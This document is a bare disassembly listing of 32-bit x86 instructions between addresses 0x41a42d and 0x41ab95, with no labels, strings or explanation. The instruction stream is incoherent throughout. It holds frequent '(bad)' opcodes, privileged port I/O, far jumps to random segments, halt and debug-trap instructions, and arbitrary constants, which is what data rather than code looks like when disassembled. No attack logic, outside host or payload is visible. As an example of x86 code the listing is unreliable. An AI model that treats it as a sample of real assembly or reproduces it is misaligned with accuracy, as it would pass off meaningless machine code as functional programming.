  41a42d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a42e:	xchg   ebx,eax
  41a42f:	xlat   BYTE PTR ds:[ebx]
  41a430:	ins    DWORD PTR es:[edi],dx
  41a431:	and    esp,eax
  41a433:	mov    ecx,0x4be0bb4a
  41a438:	outs   dx,BYTE PTR ds:[esi]
  41a439:	xchg   edx,eax
  41a43a:	pop    ebx
  41a43b:	mov    dl,0x1
  41a43d:	or     DWORD PTR [ebp+0x66ccaf04],esp
  41a443:	push   0x50fd1aac
  41a448:	add    eax,0x55e8cfca
  41a44d:	shl    BYTE PTR [edx-0x12],1
  41a450:	dec    eax
  41a451:	rcr    DWORD PTR [eax+ebp*8],0xb4
  41a455:	dec    edi
  41a456:	jle    0x41a425
  41a458:	leave  
  41a459:	in     al,dx
  41a45a:	test   eax,0x47036edc
  41a45f:	test   BYTE PTR ds:0xb972dca4,0xcc
  41a466:	mov    ds:0xa808fce1,eax
  41a46b:	scas   eax,DWORD PTR es:[edi]
  41a46c:	jge    0x41a4bc
  41a46e:	dec    ecx
  41a46f:	in     eax,0xf
  41a471:	cmc    
  41a472:	cdq    
  41a473:	test   al,0xb6
  41a475:	and    ah,BYTE PTR [edx+0x7]
  41a478:	jb     0x41a46c
  41a47a:	adc    BYTE PTR [esi],al
  41a47c:	cmp    eax,0x3289827d
  41a481:	cmp    eax,0x37a792d
  41a486:	sub    ch,BYTE PTR [edx+0x1780fe9c]
  41a48c:	xchg   BYTE PTR [edi-0x9],bh
  41a48f:	pop    eax
  41a490:	outs   dx,DWORD PTR ds:[esi]
  41a491:	inc    ecx
  41a492:	xor    BYTE PTR [ebx-0x50b79e2f],bh
  41a498:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a499:	dec    ecx
  41a49a:	sub    DWORD PTR ds:0x922ac23c,eax
  41a4a0:	test   DWORD PTR [ebx],esp
  41a4a2:	push   0x12
  41a4a4:	repnz inc di
  41a4a7:	adc    ah,dl
  41a4a9:	rcr    DWORD PTR [esi+0x6bf98ec6],cl
  41a4af:	xchg   ebp,eax
  41a4b0:	push   0x15
  41a4b2:	add    DWORD PTR [edx-0x2e],ebp
  41a4b5:	dec    edx
  41a4b6:	popf   
  41a4b7:	jmp    0x3cf1:0x3208cae0
  41a4be:	or     eax,0x27552fc7
  41a4c3:	jae    0x41a528
  41a4c5:	inc    esi
  41a4c6:	cs mov eax,ss:0xa44aa67a
  41a4cd:	iret   
  41a4ce:	push   esi
  41a4cf:	adc    bh,0x31
  41a4d2:	out    dx,al
  41a4d3:	push   0x41
  41a4d5:	ret    0xe9e0
  41a4d8:	pop    DWORD PTR [edi+0x1a]
  41a4db:	daa    
  41a4dc:	hlt    
  41a4dd:	lods   al,BYTE PTR ds:[esi]
  41a4de:	dec    esp
  41a4df:	mov    dh,0xd7
  41a4e1:	adc    BYTE PTR [ebx-0x4b],0x70
  41a4e5:	scas   al,BYTE PTR es:[edi]
  41a4e6:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41a4e8:	test   eax,0x8af3be1b
  41a4ed:	inc    ebp
  41a4ee:	add    BYTE PTR [ebp+edx*4-0x41],dl
  41a4f2:	lods   al,BYTE PTR ds:[esi]
  41a4f3:	and    ecx,DWORD PTR [ebx-0x69]
  41a4f6:	out    0x71,al
  41a4f8:	cs dec eax
  41a4fa:	sti    
  41a4fb:	mov    fs,esi
  41a4fd:	dec    edx
  41a4fe:	mov    ebp,0xe9ac062b
  41a503:	retf   
  41a504:	add    BYTE PTR [edi],bh
  41a506:	into   
  41a507:	gs sub al,0xc2
  41a50a:	jno    0x41a4da
  41a50c:	pop    ds
  41a50d:	int    0x85
  41a50f:	repz add eax,0x8e667a8f
  41a515:	inc    ebx
  41a516:	jmp    0x41a4be
  41a518:	aad    0xe8
  41a51a:	sub    al,0x30
  41a51c:	pop    edi
  41a51d:	cmp    edx,DWORD PTR [eax-0x6b]
  41a520:	arpl   WORD PTR [esp+edx*2-0x15],sp
  41a524:	lds    eax,FWORD PTR ds:0x8045e9b
  41a52a:	xor    al,0xf9
  41a52c:	(bad)  
  41a52d:	ins    BYTE PTR es:[edi],dx
  41a52e:	sub    eax,0x2491ff70
  41a533:	loopne 0x41a4ee
  41a535:	jb     0x41a50f
  41a537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a538:	add    BYTE PTR [ebx],ah
  41a53a:	mov    bh,0xb6
  41a53c:	je     0x41a538
  41a53e:	push   cs
  41a53f:	adc    al,0x61
  41a541:	fadd   st,st(0)
  41a543:	out    dx,al
  41a544:	lea    ecx,[esi-0x27e1b3e3]
  41a54a:	nop
  41a54b:	sub    al,0x94
  41a54d:	pop    eax
  41a54e:	pop    edx
  41a54f:	pop    edi
  41a550:	adc    eax,0xf641e0d4
  41a555:	xlat   BYTE PTR ds:[ebx]
  41a556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a557:	dec    esp
  41a558:	dec    edx
  41a559:	cli    
  41a55a:	stos   BYTE PTR es:[edi],al
  41a55b:	mov    al,0x2e
  41a55d:	mov    ebx,0xe268e2bd
  41a562:	mov    edx,0xe7429d73
  41a567:	retf   0x9e39
  41a56a:	jp     0x41a5aa
  41a56c:	xchg   dx,ax
  41a56e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a56f:	push   eax
  41a570:	lods   al,BYTE PTR ds:[esi]
  41a571:	mov    esi,0xe22da9f4
  41a576:	imul   esp,DWORD PTR [edi-0x76f6a279],0x287d5313
  41a580:	sbb    bl,bh
  41a582:	mov    edi,0xa158d68f
  41a587:	mov    ah,0x37
  41a589:	xchg   edx,eax
  41a58a:	out    0xa0,al
  41a58c:	mov    eax,0xbb83c7e4
  41a591:	mov    dl,BYTE PTR [edx]
  41a593:	push   edi
  41a594:	xor    al,al
  41a596:	lock mov al,ds:0x424bff46
  41a59c:	push   edi
  41a59d:	jb     0x41a523
  41a59f:	iret   
  41a5a0:	push   ds
  41a5a1:	xor    DWORD PTR fs:[esi],ebx
  41a5a4:	ins    BYTE PTR es:[edi],dx
  41a5a5:	jle    0x41a57c
  41a5a7:	fiadd  DWORD PTR [ecx+eax*2-0x7]
  41a5ab:	(bad)  
  41a5ac:	and    BYTE PTR [ebp-0x4eeea675],ch
  41a5b2:	aam    0x7d
  41a5b4:	mov    DWORD PTR [ecx-0x785d453e],ebx
  41a5ba:	jnp    0x41a5ec
  41a5bc:	test   al,0x7a
  41a5be:	or     bl,ch
  41a5c0:	add    ebp,DWORD PTR [esi+ebp*8+0x207384fa]
  41a5c7:	fist   DWORD PTR [eax]
  41a5c9:	xor    eax,0xedbf411e
  41a5ce:	js     0x41a61c
  41a5d0:	push   es
  41a5d1:	mov    bh,BYTE PTR [eax]
  41a5d3:	pop    ebx
  41a5d4:	push   ecx
  41a5d5:	or     al,0x2c
  41a5d7:	push   ecx
  41a5d8:	pusha  
  41a5d9:	sar    dh,1
  41a5db:	(bad)  
  41a5dc:	mov    eax,0x977549e4
  41a5e1:	retf   0x6c50
  41a5e4:	loop   0x41a601
  41a5e6:	sub    al,0x1c
  41a5e8:	sub    eax,0xb8f4295a
  41a5ed:	pop    eax
  41a5ee:	daa    
  41a5ef:	dec    ebp
  41a5f0:	in     al,0x8e
  41a5f2:	inc    ebp
  41a5f3:	jb     0x41a5ba
  41a5f5:	mov    edi,0x77555e46
  41a5fa:	mov    dl,0x19
  41a5fc:	ins    DWORD PTR es:[edi],dx
  41a5fd:	cwde   
  41a5fe:	pop    esp
  41a5ff:	sub    esi,DWORD PTR [ebx-0x3e]
  41a602:	inc    ebx
  41a603:	test   DWORD PTR [eax],0x92bc4901
  41a609:	or     DWORD PTR [esi+0x37e0e7d2],esi
  41a60f:	pop    edi
  41a610:	and    al,0xc9
  41a612:	add    eax,0xc17db2f5
  41a617:	xor    edx,DWORD PTR [edx+edx*4]
  41a61a:	jno    0x41a685
  41a61c:	add    DWORD PTR [edx-0x6d],ebp
  41a61f:	mov    ah,ch
  41a621:	shr    DWORD PTR [edi-0x5109cb8a],1
  41a627:	mov    ch,0x87
  41a629:	data16 cmp al,BYTE PTR [ebp-0x59]
  41a62d:	retf   
  41a62e:	cmp    eax,0xa8392c8c
  41a633:	pusha  
  41a634:	rcl    DWORD PTR [ecx+0x35],1
  41a637:	sahf   
  41a638:	mov    dl,0xaf
  41a63a:	scas   eax,DWORD PTR es:[edi]
  41a63b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a63c:	(bad)  
  41a63d:	jne    0x41a6b8
  41a63f:	xchg   ebp,eax
  41a640:	hlt    
  41a641:	outs   dx,DWORD PTR ds:[esi]
  41a642:	mov    al,ds:0x4cf5fdd5
  41a647:	inc    ebp
  41a648:	cmp    edi,edx
  41a64a:	mov    BYTE PTR [eax-0x51ca8462],ch
  41a650:	inc    eax
  41a651:	adc    cl,ah
  41a653:	pop    edx
  41a654:	nop
  41a655:	jnp    0x41a6b3
  41a657:	les    ebp,FWORD PTR [edx]
  41a659:	or     cl,bl
  41a65b:	sbb    DWORD PTR [esi],edx
  41a65d:	retf   0xbd3d
  41a660:	icebp  
  41a661:	jae    0x41a6bd
  41a663:	xchg   ebp,eax
  41a664:	xchg   ebp,eax
  41a665:	hlt    
  41a666:	mov    edx,0xa0b98521
  41a66b:	add    BYTE PTR [edi+0x1b919978],dh
  41a671:	pop    edi
  41a672:	stos   DWORD PTR es:[edi],eax
  41a673:	mov    ebp,0xff8a4ee5
  41a678:	clc    
  41a679:	mov    ebx,0x9b0b9f76
  41a67e:	sar    DWORD PTR [eax],0xa0
  41a681:	push   edi
  41a682:	out    0xbe,al
  41a684:	add    DWORD PTR [esi+0x4a],ecx
  41a687:	cs fs cmp eax,0x2a25311d
  41a68e:	cmc    
  41a68f:	outs   dx,BYTE PTR ds:[esi]
  41a690:	jns    0x41a697
  41a692:	mov    eax,DWORD PTR [edi-0x5]
  41a695:	cmc    
  41a696:	xchg   ebx,eax
  41a697:	and    al,0x1e
  41a699:	ret    0xb12f
  41a69c:	fs loope 0x41a628
  41a69f:	scas   eax,DWORD PTR es:[edi]
  41a6a0:	mov    edx,0xe0bd1bf0
  41a6a5:	inc    esp
  41a6a6:	inc    esi
  41a6a7:	push   ss
  41a6a8:	test   DWORD PTR [edi],edi
  41a6aa:	xchg   ecx,ebx
  41a6ac:	xchg   ebx,eax
  41a6ad:	add    BYTE PTR [ecx-0x4b0e9e49],0xdc
  41a6b4:	add    bl,BYTE PTR [ecx+0x16e01750]
  41a6ba:	inc    edi
  41a6bb:	les    esi,FWORD PTR [esi+0x19]
  41a6be:	ret    0xe3b9
  41a6c1:	and    BYTE PTR [esi+0x30],cl
  41a6c4:	enter  0x97b1,0xf6
  41a6c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6c9:	sbb    edx,edi
  41a6cb:	or     eax,0xd36944d6
  41a6d0:	(bad)  
  41a6d1:	data16 sahf 
  41a6d3:	xchg   edi,eax
  41a6d4:	xor    DWORD PTR [ecx+0x4e],0x2
  41a6d8:	(bad)  
  41a6d9:	jo     0x41a712
  41a6db:	mov    edx,0x622b9836
  41a6e0:	sub    ah,BYTE PTR [edx-0x49]
  41a6e3:	push   edi
  41a6e4:	ins    BYTE PTR es:[edi],dx
  41a6e5:	bound  esp,QWORD PTR [ecx-0x555e5023]
  41a6eb:	add    eax,0xa7992f97
  41a6f0:	add    ah,dh
  41a6f2:	add    DWORD PTR [esp+edx*1+0x5b7a8af5],esi
  41a6f9:	and    ebx,DWORD PTR ds:0x690a8a1e
  41a6ff:	jo     0x41a70e
  41a701:	retf   
  41a702:	or     al,0x76
  41a705:	pushf  
  41a706:	mov    bl,0x1a
  41a708:	imul   edi,DWORD PTR [ecx-0x22],0x1712dab8
  41a70f:	add    ah,ch
  41a711:	mov    dh,0xe8
  41a713:	sub    al,0xfc
  41a715:	xor    ch,BYTE PTR [ebx+0xf6c45f7]
  41a71b:	ins    BYTE PTR es:[edi],dx
  41a71c:	fimul  WORD PTR [esi+0x5387679d]
  41a722:	(bad)  
  41a724:	jmp    0x41a6ff
  41a726:	fidiv  WORD PTR [edi+0x6684e3ff]
  41a72c:	sbb    BYTE PTR [esi+0x6b],cl
  41a72f:	mov    cl,BYTE PTR [edi-0x5a]
  41a732:	adc    eax,0x124cb26b
  41a737:	pop    ds
  41a738:	aaa    
  41a739:	inc    edx
  41a73a:	pop    es
  41a73b:	add    DWORD PTR [esi],edi
  41a73d:	or     al,BYTE PTR [esi+0x24f307d6]
  41a743:	ins    BYTE PTR es:[edi],dx
  41a744:	mov    ebp,0x33b45886
  41a749:	lods   eax,DWORD PTR ds:[esi]
  41a74a:	mov    cl,0xd8
  41a74c:	jmp    0x1dcb:0x7fea5896
  41a753:	repz ficom WORD PTR [ebx-0x4c]
  41a757:	inc    ecx
  41a758:	test   eax,0x7ed4cc94
  41a75d:	adc    ecx,ebp
  41a75f:	xor    BYTE PTR [eax-0x75],al
  41a762:	es in  eax,dx
  41a764:	cs test al,0xa
  41a767:	mov    esp,0xd0a6facf
  41a76c:	mov    cl,0x6b
  41a76e:	and    BYTE PTR [ebx+ebx*2+0xa87d629],bh
  41a775:	push   edx
  41a776:	jbe    0x41a71a
  41a778:	and    ch,dl
  41a77a:	les    ebp,FWORD PTR [ecx+0x36]
  41a77d:	ins    DWORD PTR es:[edi],dx
  41a77e:	nop
  41a77f:	fst    DWORD PTR [edi-0x4f585317]
  41a785:	pusha  
  41a786:	shr    DWORD PTR [edi],1
  41a788:	mov    bl,0x9d
  41a78a:	les    edi,FWORD PTR [ecx]
  41a78c:	sbb    dh,BYTE PTR [eax-0x69]
  41a78f:	sub    DWORD PTR [ebp+0x3c],ebp
  41a792:	leave  
  41a793:	(bad)  
  41a794:	or     eax,0xbd0d4c2
  41a799:	push   0xffffffaf
  41a79b:	mov    ecx,0x857d10b3
  41a7a0:	ret    
  41a7a1:	mov    al,ds:0x88a8ffd2
  41a7a6:	cmp    eax,0x1eeccfea
  41a7ab:	mov    ecx,0x2fc2564c
  41a7b0:	push   edi
  41a7b1:	int    0x7f
  41a7b3:	or     al,0x40
  41a7b5:	aad    0x3c
  41a7b7:	inc    edx
  41a7b8:	out    0xdd,eax
  41a7ba:	in     eax,0x26
  41a7bc:	not    DWORD PTR [eax-0x66]
  41a7bf:	inc    ebx
  41a7c0:	jl     0x41a7e3
  41a7c2:	or     edx,DWORD PTR [ebx-0x23]
  41a7c5:	iret   
  41a7c6:	pop    ecx
  41a7c7:	ficomp DWORD PTR [edx+0x430d39a0]
  41a7cd:	lea    eax,[ecx-0x36]
  41a7d0:	sub    edx,DWORD PTR [edi-0x23]
  41a7d3:	pmulhw mm0,QWORD PTR [eax+0xa569f98]
  41a7da:	jae    0x41a80c
  41a7dc:	lods   al,BYTE PTR ds:[esi]
  41a7dd:	dec    ecx
  41a7de:	leave  
  41a7df:	loopne 0x41a792
  41a7e1:	dec    ebp
  41a7e2:	(bad)  
  41a7e3:	adc    DWORD PTR [esi],ecx
  41a7e5:	stc    
  41a7e6:	lods   al,BYTE PTR ds:[esi]
  41a7e7:	lds    esi,FWORD PTR [eax-0x7581713f]
  41a7ed:	xor    al,0xce
  41a7ef:	loope  0x41a77a
  41a7f1:	scas   eax,DWORD PTR es:[edi]
  41a7f2:	and    edx,DWORD PTR [edx-0x478eb36d]
  41a7f8:	bound  ecx,QWORD PTR [esi]
  41a7fa:	add    ecx,DWORD PTR [edx]
  41a7fc:	cld    
  41a7fd:	fsub   QWORD PTR [ebp+0x1e850d56]
  41a803:	and    al,0xb7
  41a805:	cmp    eax,0xf59bb566
  41a80a:	pop    ebp
  41a80b:	(bad)  
  41a80c:	jge    0x41a86e
  41a80e:	xor    ecx,ebx
  41a810:	rol    DWORD PTR [edx+0x1b58abc6],0xba
  41a817:	test   eax,0xea4fa955
  41a81c:	leave  
  41a81d:	sbb    al,0x52
  41a81f:	pop    edi
  41a820:	out    dx,al
  41a821:	clc    
  41a822:	out    0x52,eax
  41a824:	in     eax,0xee
  41a826:	retf   0xa749
  41a829:	pop    ss
  41a82a:	push   ebp
  41a82b:	xor    eax,0x15d72e33
  41a830:	call   0x8ded4b7
  41a835:	mov    ch,0x2f
  41a837:	lock ret 0x6542
  41a83b:	jbe    0x41a804
  41a83d:	add    eax,0x7c4a341
  41a842:	retf   0x4e3
  41a845:	mov    ds:0xd76fd36e,eax
  41a84a:	ins    BYTE PTR es:[edi],dx
  41a84b:	and    DWORD PTR [ebx+edi*4-0x15659cff],eax
  41a852:	out    0xd8,al
  41a854:	and    al,0x3b
  41a856:	mov    ah,BYTE PTR [ebx+eiz*1-0x6a]
  41a85a:	and    ecx,0xd4fbccb
  41a860:	stos   DWORD PTR es:[edi],eax
  41a861:	xchg   edx,eax
  41a862:	ud2    
  41a864:	pop    edx
  41a865:	je     0x41a850
  41a867:	mov    DWORD PTR [ebp-0x68],esp
  41a86a:	call   0x672cd4db
  41a86f:	add    edx,DWORD PTR [eax+0x2f]
  41a872:	fstp   TBYTE PTR [ebx]
  41a874:	dec    ecx
  41a875:	in     eax,dx
  41a876:	jno    0x41a8dc
  41a878:	push   eax
  41a879:	push   esp
  41a87a:	dec    ecx
  41a87b:	(bad)  
  41a87c:	pop    edi
  41a87d:	pop    edi
  41a87e:	(bad)  
  41a87f:	xor    BYTE PTR [edi+0x22bc23de],bh
  41a885:	and    eax,0xa61aa006
  41a88a:	je     0x41a8a8
  41a88c:	push   0x40
  41a88e:	fwait
  41a88f:	jno    0x41a884
  41a891:	xlat   BYTE PTR ds:[ebx]
  41a892:	loopne 0x41a8af
  41a894:	jle    0x93948f66
  41a89a:	add    al,0xa0
  41a89c:	sub    al,0x10
  41a89e:	mov    BYTE PTR [edx],bl
  41a8a0:	mov    edx,0x88d3457
  41a8a5:	leave  
  41a8a6:	stos   BYTE PTR es:[edi],al
  41a8a7:	je     0x41a8d2
  41a8a9:	shr    BYTE PTR [eax+0x8],1
  41a8ac:	jmp    0x41a8f5
  41a8ae:	jo     0x41a8d0
  41a8b0:	leave  
  41a8b1:	xchg   cl,ah
  41a8b3:	icebp  
  41a8b4:	cli    
  41a8b5:	cs inc eax
  41a8b7:	lahf   
  41a8b8:	mov    ecx,DWORD PTR [esi-0x31dc15db]
  41a8be:	(bad)  
  41a8bf:	into   
  41a8c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8c1:	add    dl,BYTE PTR [esi]
  41a8c3:	test   eax,0xaf21318
  41a8c8:	(bad)  
  41a8ca:	test   al,0x2d
  41a8cc:	push   ss
  41a8cd:	pop    ecx
  41a8ce:	jno    0x41a8a1
  41a8d0:	ja     0x41a852
  41a8d2:	pop    esi
  41a8d3:	scas   al,BYTE PTR es:[edi]
  41a8d4:	sub    ebp,DWORD PTR [esi+0x6101c906]
  41a8da:	daa    
  41a8db:	mov    ah,0xb8
  41a8dd:	lods   eax,DWORD PTR ds:[esi]
  41a8de:	add    bl,ch
  41a8e0:	(bad)  
  41a8e1:	div    DWORD PTR [esi+0x3b]
  41a8e4:	sub    eax,0x67e524be
  41a8e9:	lods   eax,DWORD PTR ds:[esi]
  41a8ea:	mov    eax,ds:0x8fec8c4a
  41a8ef:	pop    ds
  41a8f0:	cmp    esi,DWORD PTR [eax+esi*1]
  41a8f3:	clc    
  41a8f4:	xor    eax,eax
  41a8f6:	outs   dx,DWORD PTR ds:[esi]
  41a8f7:	dec    ecx
  41a8f9:	call   0xe391a212
  41a8fe:	add    dl,bh
  41a900:	pop    ss
  41a901:	xchg   edi,eax
  41a902:	popa   
  41a903:	ins    DWORD PTR es:[edi],dx
  41a904:	push   esp
  41a905:	inc    edi
  41a906:	(bad)  
  41a907:	bnd jmp 0x41a930
  41a90a:	mov    cs,edx
  41a90c:	and    al,BYTE PTR [edx+0x4b]
  41a90f:	push   esp
  41a910:	sbb    edx,esi
  41a912:	pop    esi
  41a913:	pop    ds
  41a914:	fsubp  st(7),st
  41a916:	jb     0x41a8f2
  41a918:	out    0xa6,eax
  41a91a:	push   es
  41a91b:	cs psrad mm6,mm4
  41a91f:	rcr    BYTE PTR [edi],cl
  41a921:	stc    
  41a922:	or     DWORD PTR [edi],esi
  41a924:	mov    dl,BYTE PTR ds:0x703d8570
  41a92a:	pusha  
  41a92b:	xchg   BYTE PTR [esi+ebp*4],al
  41a92e:	xchg   ecx,eax
  41a92f:	sbb    cl,BYTE PTR [ebp-0x12]
  41a932:	ja     0x41a8fc
  41a934:	loopne 0x41a8c7
  41a936:	in     al,0xf8
  41a938:	mov    ecx,esi
  41a93a:	ja     0x41a94e
  41a93c:	mov    eax,ds:0xdeb31e2e
  41a941:	mov    cl,BYTE PTR [esi]
  41a943:	imul   ecx,DWORD PTR [esi-0x4f],0x22
  41a947:	fwait
  41a948:	xor    eax,0xed427fb4
  41a94d:	mov    al,ds:0xbd74ce8b
  41a952:	inc    ebx
  41a953:	adc    ch,cl
  41a955:	adc    eax,0x2b545d2e
  41a95a:	lods   al,BYTE PTR ds:[esi]
  41a95b:	pusha  
  41a95c:	mov    ds:0x492de97b,al
  41a961:	clc    
  41a962:	and    ebp,DWORD PTR [edi+ecx*8-0x34]
  41a966:	addr16 inc edx
  41a968:	call   0x3c3b916c
  41a96d:	call   0x276f:0x9391405a
  41a974:	push   cs
  41a975:	stos   DWORD PTR es:[edi],eax
  41a976:	mov    gs,WORD PTR [esp+ebx*1-0xe62ecc3]
  41a97d:	daa    
  41a97e:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41a980:	xchg   ebp,eax
  41a981:	cli    
  41a982:	jo     0x41a991
  41a984:	call   0xa452:0x3d2d46f8
  41a98b:	out    dx,eax
  41a98c:	daa    
  41a98d:	retf   0x7318
  41a990:	inc    esi
  41a991:	xor    bh,BYTE PTR [ecx-0x70]
  41a994:	xor    al,0x97
  41a996:	scas   eax,DWORD PTR es:[edi]
  41a997:	push   0x54fe560d
  41a99c:	std    
  41a99d:	js     0x41a9f6
  41a99f:	jbe    0x41a94d
  41a9a1:	pop    ecx
  41a9a2:	adc    DWORD PTR [edx],0xffffffe8
  41a9a5:	and    ebp,DWORD PTR [eax]
  41a9a7:	cli    
  41a9a8:	bnd jp 0x41a9e7
  41a9ab:	cmp    DWORD PTR [ecx+edi*2+0x21],esp
  41a9af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9b0:	inc    edi
  41a9b1:	jmp    0x41a936
  41a9b3:	xchg   esi,eax
  41a9b4:	fldz   
  41a9b6:	mov    ebp,0x189d8f2c
  41a9bb:	mov    ebx,0x64b69c0c
  41a9c0:	ffree  st(1)
  41a9c2:	in     eax,0x7b
  41a9c4:	lahf   
  41a9c5:	pop    ecx
  41a9c6:	popa   
  41a9c7:	aam    0x87
  41a9c9:	retf   0x3071
  41a9cc:	mov    ebx,0xb2d0b7f
  41a9d1:	jno    0x41aa52
  41a9d3:	in     eax,0xce
  41a9d5:	or     ebp,DWORD PTR [esi+esi*1]
  41a9d8:	leave  
  41a9d9:	test   BYTE PTR [esi+0x68],bl
  41a9dc:	jp     0x41a963
  41a9de:	mov    bl,0xf5
  41a9e0:	popf   
  41a9e1:	pop    es
  41a9e2:	sbb    DWORD PTR [ecx-0x39080c77],edi
  41a9e8:	jmp    0x41aa66
  41a9ea:	inc    ebp
  41a9eb:	icebp  
  41a9ec:	inc    BYTE PTR ds:0xeb747a84
  41a9f2:	pop    edi
  41a9f3:	xchg   ebp,eax
  41a9f4:	repnz xchg edx,eax
  41a9f6:	fyl2xp1 
  41a9f8:	test   al,0x97
  41a9fa:	fwait
  41a9fb:	rol    DWORD PTR [ecx],0xae
  41a9fe:	je     0x41a983
  41aa00:	aaa    
  41aa01:	icebp  
  41aa02:	shl    BYTE PTR [ebx+0x6f2185dd],0x99
  41aa09:	sbb    eax,0xc029437c
  41aa0e:	enter  0xdcb4,0x5c
  41aa12:	inc    esi
  41aa13:	jmp    0x15d4:0xa3c24717
  41aa1a:	les    esi,FWORD PTR [ebp-0x5367791b]
  41aa20:	xor    eax,0xd7d307c3
  41aa25:	cli    
  41aa26:	push   ebx
  41aa27:	outs   dx,DWORD PTR ds:[esi]
  41aa28:	pop    ebx
  41aa29:	aam    0xe
  41aa2b:	cmp    BYTE PTR [eax],dl
  41aa2d:	jnp    0x41aa7b
  41aa2f:	into   
  41aa30:	or     al,0xb2
  41aa32:	sub    BYTE PTR [ecx],dl
  41aa34:	mov    al,ah
  41aa36:	push   cs
  41aa37:	ins    DWORD PTR es:[edi],dx
  41aa38:	dec    ecx
  41aa39:	pop    ss
  41aa3a:	inc    esp
  41aa3b:	cmp    al,0xfe
  41aa3d:	pop    ds
  41aa3e:	adc    dh,BYTE PTR [eax-0x5af16576]
  41aa44:	dec    eax
  41aa45:	jmp    0x41a9ea
  41aa47:	xchg   ecx,eax
  41aa48:	mov    dh,0x79
  41aa4a:	add    bl,BYTE PTR [ebp+0x359c99dd]
  41aa50:	test   BYTE PTR [ebp-0x21],bh
  41aa53:	fdivr  DWORD PTR [ecx]
  41aa55:	push   0x3b
  41aa57:	xor    ch,dl
  41aa59:	(bad)  
  41aa5a:	mov    ds:0xcbb4d421,al
  41aa5f:	enter  0xd86,0xc6
  41aa63:	out    dx,al
  41aa64:	fistp  WORD PTR [edi-0x2]
  41aa67:	ret    0x1fd1
  41aa6a:	add    DWORD PTR [ecx-0x4d],0xdc1df772
  41aa71:	retf   
  41aa72:	push   ss
  41aa73:	dec    eax
  41aa74:	mov    ds:0xda2ce3a6,al
  41aa79:	cmp    BYTE PTR [edx+0x1d],bh
  41aa7c:	out    0x33,al
  41aa7e:	stos   DWORD PTR es:[edi],eax
  41aa7f:	das    
  41aa80:	inc    esp
  41aa81:	in     al,dx
  41aa82:	jnp    0x41aa6e
  41aa84:	in     eax,dx
  41aa85:	enter  0x54f,0x85
  41aa89:	sub    al,0x53
  41aa8b:	lahf   
  41aa8c:	xchg   BYTE PTR [edx+0x3a],al
  41aa8f:	mov    DWORD PTR [ebx-0x41],edx
  41aa92:	add    ebp,DWORD PTR [edi+0x8cc73ab]
  41aa98:	sub    BYTE PTR [eax+0x607aa117],dl
  41aa9e:	shl    bl,cl
  41aaa0:	ficom  WORD PTR [ebx-0x60c84d69]
  41aaa6:	paddb  mm0,QWORD PTR [esi+0x50027f36]
  41aaad:	pop    edx
  41aaae:	mov    ds:0x91a86d81,eax
  41aab3:	xor    bl,BYTE PTR [edx]
  41aab5:	xor    eax,0x31f21252
  41aaba:	shl    DWORD PTR [ebx+edi*4-0x55da8dd4],cl
  41aac1:	sub    ch,0xe7
  41aac4:	sbb    al,0xa1
  41aac6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aac7:	popf   
  41aac8:	mov    bl,0x53
  41aaca:	push   eax
  41aacb:	out    dx,eax
  41aacc:	bound  esi,QWORD PTR [ecx]
  41aace:	clc    
  41aacf:	jg     0x41aa99
  41aad1:	addr16 xor al,0xd0
  41aad4:	xor    DWORD PTR [edx-0x4616e4f3],ebx
  41aada:	jo     0x41ab10
  41aadc:	imul   esp,DWORD PTR [ebx-0x341f04e5],0xffffffe0
  41aae3:	and    esi,ecx
  41aae5:	fisubr DWORD PTR [ecx-0x31192348]
  41aaeb:	xor    edi,eax
  41aaed:	mov    ch,0x75
  41aaef:	ror    edi,1
  41aaf1:	and    al,0x73
  41aaf3:	out    0x14,al
  41aaf5:	push   edi
  41aaf6:	jo     0x41ab21
  41aaf8:	ja     0x41aaee
  41aafa:	push   ds
  41aafb:	xchg   DWORD PTR [ebx-0x7e],esi
  41aafe:	mov    al,ds:0xf478c172
  41ab03:	push   esi
  41ab04:	add    eax,0xd45314f6
  41ab09:	cmp    DWORD PTR [edi-0x1014853a],0xf4122d6f
  41ab13:	popa   
  41ab14:	xchg   ecx,eax
  41ab15:	fucom  st(2)
  41ab17:	sahf   
  41ab18:	mov    ecx,0xf85d1fa2
  41ab1d:	mov    ds:0xc31953d7,al
  41ab22:	sbb    BYTE PTR [edx+0x776eaaac],bh
  41ab28:	mov    eax,DWORD PTR [edx+0x9db026d]
  41ab2e:	(bad)  
  41ab2f:	pop    esp
  41ab30:	sbb    eax,0xf64792aa
  41ab35:	add    dh,BYTE PTR [esi+0x6a]
  41ab38:	loope  0x41aadf
  41ab3a:	sub    BYTE PTR [edi+ebx*1+0x21f3db49],0x51
  41ab42:	dec    ebp
  41ab43:	and    ah,cl
  41ab45:	inc    ebx
  41ab46:	pop    es
  41ab47:	retf   0xa51c
  41ab4a:	jmp    0xa589:0x5f967668
  41ab51:	add    eax,ecx
  41ab53:	jnp    0x41ab63
  41ab55:	das    
  41ab56:	push   edi
  41ab57:	sbb    eax,0x9867e6e2
  41ab5c:	xchg   ebx,eax
  41ab5d:	sahf   
  41ab5e:	jecxz  0x41ab76
  41ab60:	lahf   
  41ab61:	cmp    al,0x84
  41ab63:	cs mov al,dh
  41ab66:	inc    edi
  41ab67:	data16 jg 0x41ab41
  41ab6a:	xchg   DWORD PTR [esi],eax
  41ab6c:	pop    ecx
  41ab6d:	inc    ebx
  41ab6e:	(bad)  
  41ab6f:	dec    esp
  41ab70:	sub    eax,0x85db0533
  41ab75:	mov    dl,0xae
  41ab77:	fdivr  st,st(3)
  41ab79:	push   ds
  41ab7a:	call   0x75c9:0x68aadb91
  41ab81:	rcl    DWORD PTR [ebp-0xa2aac65],0x12
  41ab88:	ins    BYTE PTR es:[edi],dx
  41ab89:	stos   DWORD PTR es:[edi],eax
  41ab8a:	jecxz  0x41ac07
  41ab8c:	inc    edx
  41ab8d:	cmp    ebx,DWORD PTR [esi+0x51b3867d]
  41ab93:	sub    al,ch
  41ab95:	daa    
